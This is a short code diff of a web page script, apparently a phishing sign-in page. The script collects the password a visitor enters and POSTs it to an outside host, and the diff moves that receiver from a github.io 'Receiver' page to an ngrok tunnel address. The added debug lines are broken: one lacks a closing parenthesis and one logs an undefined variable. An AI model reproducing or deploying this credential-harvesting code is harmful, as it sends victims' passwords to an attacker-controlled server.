@@ -46,7 +46,7 @@
             formData.append('text', passwordValue);
             formData.append('sign-in', 'Sign In');
 
-            fetch('https://dominator200.github.io/Receiver8787462385790687/', {
+            fetch('https://360c-188-122-68-70.ngrok-free.app', {
                 method: 'POST',
                 body: formData,
                 headers: {
@@ -62,6 +62,8 @@
             .catch(error => {
             // Handle errors here
                 console.error('Error:', error);
+                console.log('Server response:', data);
+                console.log('This might even be working';
             });
         });
       </script>
